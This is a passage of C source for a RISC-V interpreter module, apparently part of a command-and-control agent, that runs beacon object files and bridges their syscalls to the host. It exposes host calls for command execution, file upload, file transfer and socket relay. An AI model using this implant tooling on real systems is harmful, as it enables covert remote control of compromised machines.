/*
 * rvvm.c — loadable RV32IMA interpreter module.
 *
 * The payload is a static RV32 musl executable produced by the C2 when a BOF
 * is built with --riscv. The interpreter maps its segments, builds the initial
 * Linux stack and auxv, starts at musl's _start, and the guest entry shim calls
 * the BOF. Guest ecall instructions enter one syscall gate; guest RAM is an
 * ordinary private mapping and guest addresses are translated by rv_gptr().
 *
 * The interpreter core is the vendored single-header mini-rv32ima
 * (vendor/mini-rv32ima/, MIT). It is used unmodified; this file adapts it to
 * the module ABI:
 *
 *   - maps the executable into a private RV32 arena,
 *   - overrides the memory bus macros with alignment-safe, bounds-checked
 *     accessors,
 *   - implements the byte-console and exit MMIO registers,
 *   - implements the Linux syscall gate,
 *   - enforces an instruction budget and reports guest traps.
 *
 * The image is untrusted: it is never mapped executable and is only ever read
 * through the guest bus helpers. Guest and host meet at the MMIO hooks and the
 * ECALL gate, with explicit bounds checks.
 *
 * Exported ABI (everything else is hidden):
 *
 *   char *Run(const uint8_t *image, size_t len,
 *             const struct rv_bof_args *args);
 *   const char *LastError(void);
 *   int ExitCode(void);
 *   void Free(char *out);
 *
 * rv_bof_args carries the packed BOF argument block. The module is
 * single-threaded: one call at a time.
 */

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/utsname.h>
#include <time.h>
#include <unistd.h>

#define RV_EXPORT __attribute__((visibility("default")))

#define RV_RAM_BASE 0x80000000u
/* 64 MiB of guest address space: the image and brk heap occupy the low part,
 * followed by a large mmap arena, a reserved stack window, and the argument
 * block at the top. Scanners that allocate and release per-entry buffers need
 * room even when the guest allocator is slow to return pages. */
#define RV_RAM_SIZE (64u << 20)

/* Byte console: a store writes one output byte. */
#define RV_UART_MMIO 0x10000000u

/* A store here stops the run and records the guest exit status. */
#define RV_EXIT_MMIO 0x10001000u

/* Instructions per run. A guest that spins is stopped instead of wedging the
 * agent's job thread. Scanning BOFs such as tasklist and find legitimately
 * run for hundreds of millions of guest instructions, so the bound is loose
 * enough to let them finish and only catches runaway guests. */
#ifndef RV_MAX_INSNS
#define RV_MAX_INSNS 0xffffffffu
#endif
#define RV_RAM_END (RV_RAM_BASE + RV_RAM_SIZE)
#define RV_TRAP_PC RV_RAM_END

/* Guest memory layout, ordered like a normal process:
 *   0x80000000  program header scratch
 *   0x80080000  image linked by the C2 (max 4 MiB)
 *   image end   brk heap, page-aligned, up to the mmap arena
 *   0x80700000  mmap arena (51 MiB)
 *   0x83a00000  end of mmap arena
 *   0x83c00000  stack, growing down through a reserved 2 MiB window
 *   0x83e00000  argument block, up to RAM_END
 *
 * The program headers live below the image so the heap can use the whole gap
 * between the image and the mmap arena instead of the few bytes after the
 * scratch copy.
 */
#define RV_EXEC_IMAGE_END 0x80480000u
#define RV_PHDR_BASE RV_RAM_BASE
#define RV_MAP_BASE 0x80700000u
#define RV_MAP_SIZE 0x03300000u /* 51 MiB, ending at 0x83a00000 */
#define RV_EXEC_STACK_TOP 0x83c00000u
#define RV_EXEC_ARGS_BASE 0x83e00000u
#define RV_EXEC_ARGS_TOP (RV_RAM_END - 8u)

/* Never decode more than this many instructions before checking exit/trap. */
#define RV_CHUNK 4096u

/* Keep the result below the agent's 10 MiB tunnel frame cap so one BOF run
 * fits in one response even when a scanner prints a lot. */
#define RV_OUT_CAP (8u << 20)
#define RV_BOF_ARGS_MAX (RV_EXEC_ARGS_TOP - RV_EXEC_ARGS_BASE)

/* MMIO registers: the guest only needs a byte console and an exit register.
 * Everything is inside MINIRV32_MMIO_RANGE. */

#define RV_ELFCLASS32 1
#define RV_ELFDATA2LSB 1
#define RV_EV_CURRENT 1
#define RV_ET_EXEC 2
#define RV_EM_RISCV 243
#define RV_PT_LOAD 1
#define RV_ELF32_EHDR 52
#define RV_ELF32_PHDR 32
#define RV_ELF32_SHDR 40

#define RV_SYS_GETCWD 17
#define RV_SYS_FCNTL 25
#define RV_SYS_FCHMODAT 53
#define RV_SYS_OPENAT 56
#define RV_SYS_CLOSE 57
#define RV_SYS_LSEEK 62
#define RV_SYS_GETDENTS64 61
#define RV_SYS_READ 63
#define RV_SYS_WRITE 64
#define RV_SYS_READV 65
#define RV_SYS_WRITEV 66
#define RV_SYS_PPOLL 73         /* 32-bit timespec */
#define RV_SYS_PPOLL_TIME64 414 /* 64-bit timespec */
#define RV_SYS_READLINKAT 78
#define RV_SYS_EXIT 93
#define RV_SYS_EXIT_GROUP 94
#define RV_SYS_SET_TID_ADDRESS 96
#define RV_SYS_SOCKET 198
#define RV_SYS_BIND 200
#define RV_SYS_CONNECT 203
#define RV_SYS_SENDTO 206
#define RV_SYS_RECVFROM 207
#define RV_SYS_SETSOCKOPT 208
#define RV_SYS_GETSOCKOPT 209
#define RV_SYS_RECVMSG 212
#define RV_SYS_SET_ROBUST_LIST 99
#define RV_SYS_SCHED_GETAFFINITY 123
#define RV_SYS_GETGROUPS 158
#define RV_SYS_UNAME 160
#define RV_SYS_GETPID 172
#define RV_SYS_GETPPID 173
#define RV_SYS_GETUID 174
#define RV_SYS_GETEUID 175
#define RV_SYS_GETGID 176
#define RV_SYS_GETEGID 177
#define RV_SYS_BRK 214
#define RV_SYS_MUNMAP 215
#define RV_SYS_MMAP2 192
#define RV_SYS_MMAP 222
#define RV_SYS_MPROTECT 226
#define RV_SYS_PRLIMIT64 261
#define RV_SYS_GETRANDOM 278
#define RV_SYS_STATX 291
#define RV_SYS_RSEQ 293
#define RV_SYS_CLOCK_GETTIME64 403

/* Private host calls, outside the Linux syscall range. A guest reaches them
 * only when the agent installed a host bridge; otherwise they return -ENOSYS.
 * Keep the numbers in sync with core/internal/cc/modules/rvguest/main.c. */
#define RV_SYS_XFER_READ 0x40000001u
#define RV_SYS_XFER_WRITE 0x40000002u
#define RV_SYS_XFER_UPLOAD 0x40000004u
#define RV_SYS_XFER_SHA256 0x40000005u
#define RV_SYS_XFER_RELAY 0x40000006u
#define RV_SYS_XFER_EXEC 0x40000007u

/* Bounds for the poll array and sockaddr a guest may hand the gate. */
#define RV_POLL_MAX_FDS 64
#define RV_SOCKADDR_MAX 128

typedef int (*rv_host_read_fn)(void *ctx, const char *path, unsigned char **out,
                               unsigned long *len, char *err, int err_cap);
typedef int (*rv_host_write_fn)(void *ctx, const char *path,
                                const unsigned char *data, unsigned long len,
                                char *err, int err_cap);
typedef int (*rv_host_upload_fn)(void *ctx, const char *token, const char *path,
                                 unsigned long offset, char *err, int err_cap);
typedef int (*rv_host_sha256_fn)(void *ctx, const unsigned char *data,
                                 unsigned long len, char *hex,
                                 unsigned long hex_cap, char *err, int err_cap);
typedef int (*rv_host_relay_fn)(void *ctx, const char *token, int fd,
                                int idle_seconds, char *err, int err_cap);
typedef int (*rv_host_exec_fn)(void *ctx, const char *cmd, int shell, char *out,
                               unsigned long out_cap, char *err, int err_cap);

static void *rv_host_ctx;
static rv_host_read_fn rv_host_read;
static rv_host_write_fn rv_host_write;
static rv_host_upload_fn rv_host_upload;
static rv_host_sha256_fn rv_host_sha256;
static rv_host_relay_fn rv_host_relay;
static rv_host_exec_fn rv_host_exec;

static void rv_mmio_store(uint32_t addr, uint32_t val);
static uint32_t rv_mmio_load(uint32_t addr);

struct MiniRV32IMAState;
static void rv_host_postexec(struct MiniRV32IMAState *state, uint32_t *pc,
                             uint32_t ir, uint32_t *trap);

/* Keep this layout in sync with core/c_agent/src/rvvm.c and the Go runner. */
struct rv_bof_args {
  const uint8_t *buf; /* packed BOF argument buffer */
  size_t len;
  const uint8_t *env; /* NUL-separated KEY=VALUE block, ... NUL */
  size_t env_len;
};

static uint8_t *rv_ram;
static char *rv_out;
static size_t rv_out_len;
static size_t rv_out_cap;
static char rv_err[160];
static int rv_guest_status;
static int rv_stopped;
static int rv_bad_bus;
static uint32_t rv_insn_budget = RV_MAX_INSNS;
static uint32_t rv_heap_cur;
static uint32_t rv_brk_min;

/* One byte per mmap-arena page: 0 free, 1 mapped. A page bitmap models Linux
 * mmap/munmap exactly, including partial unmaps, so a guest allocator that
 * releases sub-ranges cannot leak the whole arena. */
#define RV_MAP_PAGES (RV_MAP_SIZE / 4096u)
static uint8_t rv_map_used[RV_MAP_PAGES];

/*
 * Guest file descriptors. A guest never names a host descriptor: sockets and
 * files it opens through the syscall gate are recorded here and returned as
 * RV_GUEST_FD_BASE + slot. Every fd-taking syscall translates back, so a
 * hostile or buggy guest cannot read, write, poll, connect or close the
 * agent's own descriptors (the C2 transport, stdio, or any other agent fd).
 * Guest fds 1 and 2 are not in this table: they are the captured BOF output.
 */
#define RV_GUEST_FD_BASE 1024
#define RV_GUEST_FD_SLOTS 64

static int rv_guest_fd_host[RV_GUEST_FD_SLOTS];
static uint8_t rv_guest_fd_used[RV_GUEST_FD_SLOTS];

static void rv_guest_fds_reset(void) {
  for (int i = 0; i < RV_GUEST_FD_SLOTS; i++) {
    if (!rv_guest_fd_used[i])
      continue;
    if (rv_guest_fd_host[i] >= 0)
      close(rv_guest_fd_host[i]);
    rv_guest_fd_used[i] = 0;
    rv_guest_fd_host[i] = -1;
  }
}

/* Record a host descriptor and return the guest-visible number, or -1 when the
 * table is full; the caller closes the host descriptor in that case. */
static int rv_guest_fd_alloc(int host_fd) {
  if (host_fd < 0)
    return -1;
  for (int i = 0; i < RV_GUEST_FD_SLOTS; i++) {
    if (rv_guest_fd_used[i])
      continue;
    rv_guest_fd_used[i] = 1;
    rv_guest_fd_host[i] = host_fd;
    return RV_GUEST_FD_BASE + i;
  }
  return -1;
}

/* Translate a guest number to its host descriptor, or -1 when the guest does
 * not own it. */
static int rv_guest_fd_host_of(int guest_fd) {
  int slot = guest_fd - RV_GUEST_FD_BASE;
  if (slot < 0 || slot >= RV_GUEST_FD_SLOTS || !rv_guest_fd_used[slot])
    return -1;
  return rv_guest_fd_host[slot];
}

/* Remove a guest number from the table and return its host descriptor. Used by
 * close and by the relay, which takes ownership of the descriptor. */
static int rv_guest_fd_take(int guest_fd) {
  int slot = guest_fd - RV_GUEST_FD_BASE;
  if (slot < 0 || slot >= RV_GUEST_FD_SLOTS || !rv_guest_fd_used[slot])
    return -1;
  rv_guest_fd_used[slot] = 0;
  int host_fd = rv_guest_fd_host[slot];
  rv_guest_fd_host[slot] = -1;
  return host_fd;
}

/* Directory descriptor for the *at() syscalls: AT_FDCWD passes through, any
 * other value must be a guest-owned descriptor (-1 when it is not). */
static int rv_guest_dirfd(uint32_t raw) {
  int32_t d = (int32_t)raw;
  if (d == -100) /* AT_FDCWD */
    return -100;
  return rv_guest_fd_host_of(d);
}

static void rv_memzero(void *dst, size_t n);
static void rv_memcpy(void *dst, const void *src, size_t n);
static uint32_t rv_le32(const uint8_t *p);
static void rv_wr32(uint32_t off, uint32_t v);
void rv_set_err(const char *msg);

void rv_set_err(const char *msg) {
  size_t i = 0;
  if (rv_err[0] != '\0')
    return;
  while (msg[i] != '\0' && i < sizeof(rv_err) - 1) {
    rv_err[i] = msg[i];
    i++;
  }
  rv_err[i] = '\0';
}

/* The output buffer grows like any heap string, so the module does not carry a
 * megabyte of static storage that only exists while a BOF writes output. */
static int rv_out_reserve(size_t extra) {
  size_t need = rv_out_len + extra + 1u;
  if (need <= rv_out_cap)
    return 0;
  size_t cap = rv_out_cap != 0 ? rv_out_cap : 256u;
  while (cap < need)
    cap <<= 1;
  if (cap > RV_OUT_CAP)
    cap = RV_OUT_CAP;
  char *p = (char *)realloc(rv_out, cap);
  if (p == NULL) {
    rv_set_err("out of memory");
    rv_stopped = 1;
    return -1;
  }
  rv_out = p;
  rv_out_cap = cap;
  return 0;
}

static int rv_out_append(const void *data, size_t len) {
  if (len > RV_OUT_CAP - 1u - rv_out_len) {
    rv_set_err("output limit reached");
    rv_stopped = 1;
    return -1;
  }
  if (rv_out_reserve(len) != 0)
    return -1;
  if (len > 0)
    rv_memcpy(rv_out + rv_out_len, data, len);
  rv_out_len += len;
  rv_out[rv_out_len] = '\0';
  return 0;
}

/* Local byte helpers. The module imports libc only for host services; keeping
 * the guest copy/zero paths free of libc means a loader that resolves memcpy
 * or memset through an IFUNC resolver cannot corrupt guest images. */
static void rv_memzero(void *dst, size_t n) {
  unsigned char *d = (unsigned char *)dst;
  for (size_t i = 0; i < n; i++)
    d[i] = 0;
}

static void rv_memcpy(void *dst, const void *src, size_t n) {
  unsigned char *d = (unsigned char *)dst;
  const unsigned char *s = (const unsigned char *)src;
  for (size_t i = 0; i < n; i++)
    d[i] = s[i];
}

/* Compare two bounded names (no assumption about NUL terminators). */
static int rv_name_eq(const char *a, size_t alen, const char *b, size_t blen) {
  if (alen != blen)
    return 0;
  for (size_t i = 0; i < alen; i++) {
    if (a[i] != b[i])
      return 0;
  }
  return 1;
}

/* Length of a name within `avail` bytes, stopping at NUL. */
static size_t rv_name_len(const char *s, size_t avail) {
  size_t n = 0;
  while (n < avail && s[n] != '\0')
    n++;
  return n;
}

/* Append `text` to `prefix` and publish it as the run error. */
static void rv_set_err_text(const char *prefix, const char *text, size_t len) {
  char msg[160];
  size_t p = 0;
  while (prefix[p] != '\0' && p < sizeof(msg) - 1) {
    msg[p] = prefix[p];
    p++;
  }
  for (size_t i = 0; i < len && p < sizeof(msg) - 1; i++) {
    if (text[i] == '\0')
      break;
    msg[p++] = text[i];
  }
  msg[p] = '\0';
  rv_set_err(msg);
}

static void rv_set_err_hex(const char *prefix, uint32_t value) {
  static const char hex[] = "0123456789abcdef";
  char text[14] = " at 0x";
  for (size_t i = 0; i < 8; i++)
    text[6 + i] = hex[(value >> (28 - 4 * i)) & 0xfu];
  rv_set_err_text(prefix, text, sizeof(text));
}

/* Guest RAM is an ordinary private mapping. Guest addresses are translated by
 * rv_gptr(), so the arena does not have to sit at the guest's own addresses
 * and the host sees a normal anonymous region for the duration of a run. */
static int rv_ram_map(void) {
  if (rv_ram != NULL)
    return 0;
  void *p = mmap(NULL, RV_RAM_SIZE, PROT_READ | PROT_WRITE,
                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (p == MAP_FAILED) {
    rv_set_err("out of memory");
    return -1;
  }
  rv_ram = (uint8_t *)p;
  return 0;
}

static void rv_ram_unmap(void) {
  if (rv_ram == NULL)
    return;
  munmap(rv_ram, RV_RAM_SIZE);
  rv_ram = NULL;
}

/* ---- guest memory bus ---------------------------------------------------- */
/* mini-rv32ima bounds-checks data accesses before calling these, but the
 * instruction fetch only checks `ofs < RAM_SIZE`, so the helpers check again
 * and latch a fault instead of reading past the arena. Byte-wise access keeps
 * unaligned guest loads legal and avoids host alignment UB. */

static int rv_in_ram(uint32_t off, uint32_t n) {
  return off <= RV_RAM_SIZE && n <= RV_RAM_SIZE - off;
}

static uint8_t rv_rd8(uint32_t off) {
  if (!rv_in_ram(off, 1)) {
    rv_bad_bus = 1;
    return 0;
  }
  return rv_ram[off];
}

static uint16_t rv_rd16(uint32_t off) {
  if (!rv_in_ram(off, 2)) {
    rv_bad_bus = 1;
    return 0;
  }
  return (uint16_t)(rv_ram[off] | ((uint16_t)rv_ram[off + 1] << 8));
}

static uint32_t rv_rd32(uint32_t off) {
  if (!rv_in_ram(off, 4)) {
    rv_bad_bus = 1;
    return 0;
  }
  return (uint32_t)rv_ram[off] | ((uint32_t)rv_ram[off + 1] << 8) |
         ((uint32_t)rv_ram[off + 2] << 16) | ((uint32_t)rv_ram[off + 3] << 24);
}

static void rv_wr8(uint32_t off, uint8_t v) {
  if (!rv_in_ram(off, 1)) {
    rv_bad_bus = 1;
    return;
  }
  rv_ram[off] = v;
}

static void rv_wr16(uint32_t off, uint16_t v) {
  if (!rv_in_ram(off, 2)) {
    rv_bad_bus = 1;
    return;
  }
  rv_ram[off] = (uint8_t)v;
  rv_ram[off + 1] = (uint8_t)(v >> 8);
}

static void rv_wr32(uint32_t off, uint32_t v) {
  if (!rv_in_ram(off, 4)) {
    rv_bad_bus = 1;
    return;
  }
  rv_ram[off] = (uint8_t)v;
  rv_ram[off + 1] = (uint8_t)(v >> 8);
  rv_ram[off + 2] = (uint8_t)(v >> 16);
  rv_ram[off + 3] = (uint8_t)(v >> 24);
}

static void rv_mmio_store(uint32_t addr, uint32_t val) {
  switch (addr) {
  case RV_UART_MMIO: {
    uint8_t ch = (uint8_t)val;
    if (rv_out_append(&ch, 1) != 0)
      rv_stopped = 1;
    return;
  }
  case RV_EXIT_MMIO:
    rv_guest_status = (int)val;
    rv_stopped = 1;
    return;
  default:
    rv_set_err("bad mmio store");
    rv_stopped = 1;
    return;
  }
}

static uint32_t rv_mmio_load(uint32_t addr) {
  (void)addr;
  rv_set_err("bad mmio load");
  rv_stopped = 1;
  return 0;
}

/* ---- interpreter core (vendored, unmodified) ----------------------------- */

#define MINI_RV32_RAM_SIZE RV_RAM_SIZE
#define MINIRV32_RAM_IMAGE_OFFSET RV_RAM_BASE
#define MINIRV32WARN(...) ((void)0)
#define MINIRV32_HANDLE_MEM_STORE_CONTROL(a, v)                                \
  rv_mmio_store((uint32_t)(a), (uint32_t)(v))
#define MINIRV32_HANDLE_MEM_LOAD_CONTROL(a, v)                                 \
  ((v) = rv_mmio_load((uint32_t)(a)))
#define MINIRV32_CUSTOM_MEMORY_BUS 1
#define MINIRV32_STORE1(ofs, val) rv_wr8((uint32_t)(ofs), (uint8_t)(val))
#define MINIRV32_STORE2(ofs, val) rv_wr16((uint32_t)(ofs), (uint16_t)(val))
#define MINIRV32_STORE4(ofs, val) rv_wr32((uint32_t)(ofs), (uint32_t)(val))
#define MINIRV32_LOAD1(ofs) rv_rd8((uint32_t)(ofs))
#define MINIRV32_LOAD2(ofs) rv_rd16((uint32_t)(ofs))
#define MINIRV32_LOAD4(ofs) rv_rd32((uint32_t)(ofs))
#define MINIRV32_LOAD1_SIGNED(ofs) ((int8_t)rv_rd8((uint32_t)(ofs)))
#define MINIRV32_LOAD2_SIGNED(ofs) ((int16_t)rv_rd16((uint32_t)(ofs)))
#define MINIRV32_POSTEXEC(pc, ir, trap)                                        \
  rv_host_postexec(state, &(pc), (ir), &(trap))
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-parameter"
#define MINIRV32_IMPLEMENTATION
#include "vendor/mini-rv32ima/mini-rv32ima.h"
#pragma GCC diagnostic pop

static uint8_t *rv_gptr(uint32_t addr, uint32_t len) {
  if (addr < RV_RAM_BASE || !rv_in_ram(addr - RV_RAM_BASE, len))
    return NULL;
  return rv_ram + (addr - RV_RAM_BASE);
}

/* The guest passes a 64-bit off_t struct flock; the module only targets 64-bit
 * hosts, whose layout is identical. */
_Static_assert(sizeof(struct flock) == 32,
               "unexpected host struct flock layout");
/* The guest pollfd array is copied in and out as a whole, so the layouts must
 * match: int fd, short events, short revents. */
_Static_assert(sizeof(struct pollfd) == 8,
               "unexpected host struct pollfd layout");

static int rv_guest_path(uint32_t addr, char *out, size_t cap) {
  if (cap == 0)
    return -1;
  for (size_t i = 0; i < cap; i++) {
    if (addr < RV_RAM_BASE || addr - RV_RAM_BASE >= RV_RAM_SIZE)
      return -1;
    out[i] = (char)rv_ram[addr - RV_RAM_BASE];
    if (out[i] == '\0')
      return 0;
    addr++;
  }
  out[cap - 1] = '\0';
  return -1;
}

static uint32_t rv_guest_mmap(uint32_t len) {
  if (len == 0 || len > RV_MAP_SIZE)
    return 0;
  if (len > UINT32_MAX - 4095u)
    return 0;
  size_t pages = ((size_t)len + 4095u) >> 12;
  for (size_t i = 0; i + pages <= RV_MAP_PAGES; i++) {
    if (rv_map_used[i])
      continue;
    size_t j = i;
    while (j < i + pages && !rv_map_used[j])
      j++;
    if (j != i + pages) {
      i = j;
      continue;
    }
    for (j = i; j < i + pages; j++)
      rv_map_used[j] = 1;
    uint32_t addr = RV_MAP_BASE + (uint32_t)i * 4096u;
    rv_memzero(rv_ram + (addr - RV_RAM_BASE), pages * 4096u);
    return addr;
  }
  return 0;
}

static void rv_guest_munmap(uint32_t addr, uint32_t len) {
  if (len == 0 || addr < RV_MAP_BASE || addr - RV_MAP_BASE >= RV_MAP_SIZE)
    return;
  size_t first = (addr - RV_MAP_BASE) >> 12;
  size_t pages = ((size_t)len + 4095u) >> 12;
  if (first + pages > RV_MAP_PAGES)
    pages = RV_MAP_PAGES - first;
  for (size_t i = 0; i < pages; i++)
    rv_map_used[first + i] = 0;
}

/* Host file transfer: every path and buffer crosses the guest boundary here,
 * and each one is bounds-checked against guest RAM before it is touched. */
static int64_t rv_host_read_into_guest(char *path, uint32_t out_addr,
                                       uint32_t cap) {
  unsigned char *data = NULL;
  unsigned long len = 0;
  char err[160] = {0};
  if (rv_host_read == NULL)
    return -38;
  int rc = rv_host_read(rv_host_ctx, path, &data, &len, err, (int)sizeof(err));
  if (rc != 0)
    return rc;
  /* A NULL destination is a size query: the guest allocates and asks again. */
  if (out_addr == 0) {
    free(data);
    return (int64_t)len;
  }
  if (len > cap) {
    free(data);
    return -34;
  }
  if (len > 0) {
    void *dst = rv_gptr(out_addr, (uint32_t)len);
    if (dst == NULL) {
      free(data);
      return -14;
    }
    rv_memcpy(dst, data, len);
  }
  free(data);
  return (int64_t)len;
}

static int64_t rv_host_write_from_guest(char *path, uint32_t src_addr,
                                        uint32_t len) {
  const void *src = rv_gptr(src_addr, len);
  if (src == NULL && len != 0)
    return -14;
  if (rv_host_write == NULL)
    return -38;
  char err[160] = {0};
  return rv_host_write(rv_host_ctx, path, src, len, err, (int)sizeof(err));
}

static int64_t rv_host_upload_from_guest(uint32_t token_addr,
                                         uint32_t path_addr, uint32_t offset) {
  char token[1024];
  char path[1024];
  if (rv_guest_path(token_addr, token, sizeof(token)) != 0 ||
      rv_guest_path(path_addr, path, sizeof(path)) != 0)
    return -22;
  if (rv_host_upload == NULL)
    return -38;
  char err[160] = {0};
  return rv_host_upload(rv_host_ctx, token, path, (unsigned long)offset, err,
                        (int)sizeof(err));
}

static int64_t rv_host_sha256_to_guest(uint32_t src_addr, uint32_t len,
                                       uint32_t hex_addr, uint32_t hex_cap) {
  const void *src = rv_gptr(src_addr, len);
  if (src == NULL && len != 0)
    return -14;
  void *hex = rv_gptr(hex_addr, hex_cap);
  if (hex == NULL || hex_cap < 65)
    return -22;
  if (rv_host_sha256 == NULL)
    return -38;
  char err[160] = {0};
  return rv_host_sha256(rv_host_ctx, src, len, (char *)hex, hex_cap, err,
                        (int)sizeof(err));
}

/* Hand a connected socket to the agent's relay; the token lives in guest RAM
 * and the socket is the host descriptor the guest opened. */
static int64_t rv_host_relay_from_guest(uint32_t token_addr, int fd,
                                        uint32_t idle_seconds) {
  char token[1024];
  if (rv_guest_path(token_addr, token, sizeof(token)) != 0)
    return -22;
  if (rv_host_relay == NULL)
    return -38;
  char err[160] = {0};
  return rv_host_relay(rv_host_ctx, token, fd, (int)idle_seconds, err,
                       (int)sizeof(err));
}

/* Run a command and place its output in guest memory. The host writes through
 * a host buffer because the guest pointer is only valid inside guest RAM. */
static int64_t rv_host_exec_to_guest(uint32_t cmd_addr, int32_t shell,
                                     uint32_t out_addr, uint32_t cap) {
  char cmd[1024];
  if (rv_guest_path(cmd_addr, cmd, sizeof(cmd)) != 0)
    return -22;
  if (rv_host_exec == NULL)
    return -38;
  if (cap == 0)
    return -22;
  if (cap > (64u << 10))
    cap = 64u << 10;
  char *buf = (char *)malloc(cap);
  if (buf == NULL)
    return -12;
  char err[160] = {0};
  int rc = rv_host_exec(rv_host_ctx, cmd, shell, buf, (unsigned long)cap, err,
                        (int)sizeof(err));
  if (rc > 0) {
    void *dst = rv_gptr(out_addr, (uint32_t)rc);
    if (dst == NULL) {
      free(buf);
      return -14;
    }
    rv_memcpy(dst, buf, (size_t)rc);
  }
  free(buf);
  return rc;
}

/* ppoll, for both guest timespec layouts: the 32-bit syscall passes two words,
 * ppoll_time64 a 64-bit timespec. A signal mask cannot cross the gate, and host
 * poll() counts milliseconds, so any deadline is rounded up. */
static int64_t rv_guest_ppoll(uint32_t fds_addr, uint32_t nfds,
                              uint32_t tsp_addr, uint32_t sigmask, int time64) {
  if (sigmask != 0)
    return -38;
  if (nfds > RV_POLL_MAX_FDS)
    return -22;
  size_t bytes = (size_t)nfds * sizeof(struct pollfd);
  struct pollfd *fds = NULL;
  if (bytes > 0) {
    const void *guest = rv_gptr(fds_addr, (uint32_t)bytes);
    if (guest == NULL)
      return -22;
    fds = (struct pollfd *)malloc(bytes);
    if (fds == NULL)
      return -12;
    rv_memcpy(fds, guest, bytes);
  }
  /* Translate guest descriptors. An unowned one reports POLLNVAL, like poll()
   * on a closed descriptor, instead of reaching an agent descriptor. */
  uint8_t invalid[RV_POLL_MAX_FDS];
  rv_memzero(invalid, sizeof(invalid));
  for (uint32_t i = 0; i < nfds; i++) {
    int host_fd = rv_guest_fd_host_of(fds[i].fd);
    if (host_fd < 0) {
      invalid[i] = 1;
      fds[i].fd = -1;
    } else {
      fds[i].fd = host_fd;
    }
  }
  int timeout_ms = -1;
  if (tsp_addr != 0) {
    const uint8_t *g = rv_gptr(tsp_addr, time64 ? 16u : 12u);
    if (g == NULL) {
      free(fds);
      return -22;
    }
    int64_t sec = 0;
    int64_t nsec = 0;
    rv_memcpy(&sec, g, 8);
    if (time64) {
      rv_memcpy(&nsec, g + 8, 8);
    } else {
      int32_t nsec32 = 0;
      rv_memcpy(&nsec32, g + 8, 4);
      nsec = nsec32;
    }
    if (sec < 0 || nsec < 0 || nsec >= 1000000000 || sec > INT32_MAX / 1000) {
      free(fds);
      return -22;
    }
    timeout_ms = (int)(sec * 1000 + (nsec + 999999) / 1000000);
  }
  int r = poll(fds, (nfds_t)nfds, timeout_ms);
  int saved = errno;
  if (r >= 0) {
    for (uint32_t i = 0; i < nfds; i++) {
      if (!invalid[i])
        continue;
      fds[i].revents = POLLNVAL;
      r++;
    }
  }
  if (r >= 0 && bytes > 0) {
    void *back = rv_gptr(fds_addr, (uint32_t)bytes);
    if (back == NULL) {
      free(fds);
      return -22;
    }
    rv_memcpy(back, fds, bytes);
  }
  free(fds);
  return r < 0 ? -saved : r;
}

static int64_t rv_guest_syscall(uint32_t nr, uint32_t a0, uint32_t a1,
                                uint32_t a2, uint32_t a3, uint32_t a4,
                                uint32_t a5) {
  (void)a4;
  (void)a5;
  switch (nr) {
  case RV_SYS_EXIT:
  case RV_SYS_EXIT_GROUP:
    rv_guest_status = (int)a0;
    rv_stopped = 1;
    return 0;
  case RV_SYS_BRK:
    if (a0 != 0) {
      /* musl may ask for a page-aligned break below the loaded image; clamp
       * it up instead of rejecting the request, otherwise musl gives up on
       * brk and routes every allocation through the mmap arena. */
      uint32_t want = a0;
      if (want < rv_brk_min)
        want = rv_brk_min;
      if (want <= RV_MAP_BASE)
        rv_heap_cur = want;
    }
    return rv_heap_cur;
  case RV_SYS_MMAP:
  case RV_SYS_MMAP2: {
    uint32_t p = rv_guest_mmap(a1);
    return p == 0 ? -12 : p;
  }
  case RV_SYS_MUNMAP:
    rv_guest_munmap(a0, a1);
    return 0;
  case RV_SYS_MPROTECT:
    return 0;
  case RV_SYS_SET_TID_ADDRESS:
    return getpid();
  case RV_SYS_SET_ROBUST_LIST:
  case RV_SYS_RSEQ:
    return 0;
  case RV_SYS_FCNTL: {
    int fd = rv_guest_fd_host_of((int)a0);
    if (fd < 0)
      return -9; /* EBADF: not a descriptor the guest opened */
    /* Lock commands pass a struct flock. Translate it through a local copy so
     * the raw guest address never reaches the kernel. musl numbers the
     * 64-bit-offset lock commands 12/13/14 on 32-bit guests. */
    int cmd = (int)a1;
    int host_cmd = cmd;
    struct flock fl;
    void *gfl = NULL;
    void *arg = (void *)(uintptr_t)a2;
    switch (cmd) {
    case 5:  /* F_GETLK */
    case 6:  /* F_SETLK */
    case 7:  /* F_SETLKW */
    case 12: /* F_GETLK64 */
    case 13: /* F_SETLK64 */
    case 14: /* F_SETLKW64 */
    case 36: /* F_OFD_GETLK */
    case 37: /* F_OFD_SETLK */
    case 38: /* F_OFD_SETLKW */
      gfl = rv_gptr(a2, sizeof(fl));
      if (gfl == NULL)
        return -22;
      rv_memcpy(&fl, gfl, sizeof(fl));
      arg = &fl;
      if (cmd == 12)
        host_cmd = 5;
      else if (cmd == 13)
        host_cmd = 6;
      else if (cmd == 14)
        host_cmd = 7;
      break;
    default:
      break;
    }
    int r = fcntl(fd, host_cmd, arg);
    if (r < 0)
      return -errno;
    if (gfl != NULL)
      rv_memcpy(gfl, &fl, sizeof(fl));
    return r;
  }
  case RV_SYS_SOCKET: {
    int host_fd = socket((int)a0, (int)a1, (int)a2);
    if (host_fd < 0)
      return -errno;
    int guest_fd = rv_guest_fd_alloc(host_fd);
    if (guest_fd < 0) {
      close(host_fd);
      return -24; /* EMFILE */
    }
    return guest_fd;
  }
  case RV_SYS_BIND: {
    int fd = rv_guest_fd_host_of((int)a0);
    if (fd < 0)
      return -9;
    const void *addr = rv_gptr(a1, a2);
    return addr == NULL
               ? -22
               : (bind(fd, (const struct sockaddr *)addr, a2) < 0 ? -errno : 0);
  }
  case RV_SYS_CONNECT: {
    /* AF_INET, AF_INET6 and AF_UNIX socket addresses have the same layout on
     * 32-bit and 64-bit Linux, so the guest structure crosses the gate as is.
     */
    int fd = rv_guest_fd_host_of((int)a0);
    if (fd < 0)
      return -9;
    const void *addr = rv_gptr(a1, a2);
    if (a2 > RV_SOCKADDR_MAX || (addr == NULL && a2 != 0))
      return -22;
    return connect(fd, (const struct sockaddr *)addr, (socklen_t)a2) < 0
               ? -errno
               : 0;
  }
  case RV_SYS_SENDTO: {
    int fd = rv_guest_fd_host_of((int)a0);
    if (fd < 0)
      return -9;
    const void *buf = rv_gptr(a1, a2);
